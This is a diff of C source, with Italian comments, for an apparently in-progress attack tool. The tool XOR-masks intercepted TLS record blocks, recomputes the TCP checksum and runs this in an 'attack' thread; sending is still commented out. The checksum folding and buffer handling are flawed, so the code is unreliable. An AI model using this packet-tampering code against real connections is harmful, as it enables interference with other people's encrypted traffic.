@@ -348,6 +348,7 @@ int analyze_application_data(Byte *payload, int payload_len){
 //function to modify the packet
 void modify_packet(int block_pos, int byte_pos){
 
+  //tutta la parte di creazione della maschera e xor va poi messa in una apposita funzione
   Byte *prec_block = data_packet->data;
   
   Byte *bytes_to_add = NULL;
@@ -363,8 +364,6 @@ void modify_packet(int block_pos, int byte_pos){
 
   Byte *mask_first_bytes = (Byte *) malloc(sizeof(Byte) * data_packet->data_len);
   mask_first_bytes = make_mask_first_bytes(block_pos, data_packet);
-
-  //devo poi capire come inserire i valori che mi servono all'interno dei byte "decifrati" prima
  
   //xor tra maschera e pacchetto originale
   Byte *modified_packet = xor_block(prec_block, mask, data_packet->data_len);
@@ -375,17 +374,54 @@ void modify_packet(int block_pos, int byte_pos){
   printf(" \n Stampa del'header dopo maschera! \n");
   print_tls_header(modified_first_bytes);
 
-
   printf("\n stampa del pacchetto dopo maschera first bytes!  \n");
   print_blocks(modified_first_bytes, data_packet->data_len);
 
+  data_packet->data = modified_first_bytes;
 }
 
 //TROVARE UNA SOLUZIONE MIGLIORE ALLA GESTIONE DEL -5 SULLA GRANDEZZA DEL PACCHETTO DATA
 
-//function to recalculate the TCP checksum
-void recalculate_checksum(){
+//function to recalculate the TCP checksum (provare dopo a spostarla in utility.c passando come paramento const Data_packet **)
+unsigned short recalculate_checksum(){
 
+  unsigned long sum = 0;
+  unsigned short checksum = 0;
+  uint16_t tcp_total_len = data_packet->tcp_header_len + data_packet->data_len;
+
+  //create the Ip Pseudo Header
+  sum += (data_packet->ip_header->saddr >> 16) & 0xFFFF;
+  sum += (data_packet->ip_header->saddr) & 0xFFFF;
+  sum += (data_packet->ip_header->daddr >> 16) & 0xFFFF;
+  sum += (data_packet->ip_header->daddr) & 0xFFFF;
+  sum += htons(tcp_total_len) & 0xFFFF;
+  sum += htons(IPPROTO_TCP) & 0xFFFF;
+
+  //__be16 is like unsigned short but tells us that is in network byte order (we don't need htons())
+
+  unsigned short *ptr = (unsigned short *)data_packet->tcp_header;
+  int byte_left = (int)tcp_total_len;
+
+  while(byte_left > 1){
+    sum += *ptr;
+    ptr++;
+    byte_left-=2;
+  }
+
+  if(byte_left == 1){ //we need padding
+    sum += (0x0000 | *(unsigned char *)ptr) & 0xFFFF;
+  }
+  printf("%#lx\n",sum);
+  
+
+  do{
+    sum = ((sum & 0xFFFF) + (sum >> 16) & 0xFFFF);
+  }while((sum >> 16) != 0);
+  
+  printf("Sono alla fine del ciclo! \n");
+  checksum = ~sum & 0xFFFF;
+  
+  return checksum;
 }
 
 //function to send the modified packet to the server
@@ -407,6 +443,7 @@ void stop_timer(){
 //thread function to perform attack
 void *do_attack_thread(void *arg){
 
+  unsigned short checksum;
   while(1==1){
     while(attack == false){
       //pthread_mutex_lock(&attack_thread_mutex);
@@ -421,10 +458,19 @@ void *do_attack_thread(void *arg){
     printf("- - - - - - -  - - - - - - BLOCCHI - - - -  - - - - -  - - - - - ");
     //capire come devo modificare il pacchetto e come tenere traccia della posizione del byte da modificare e con quale valore modificarlo
     print_data_blocks(data_packet->data, data_packet->data_len);
-
-    
     
     modify_packet(4,14);
+
+    printf("STAMPA NEL THREAD DEL PACCHETTO MODIFICATO \n");
+
+    print_data_blocks(data_packet->data, data_packet->data_len);
+
+    printf("Recalculate checksum! \n");
+
+    checksum = recalculate_checksum();
+
+    printf("Checksum: %04x \n", checksum);
+  
     //recalculate_checksum();
     //data_packet->ip_header->checksum = new_checksum
     //send_modified_packet();
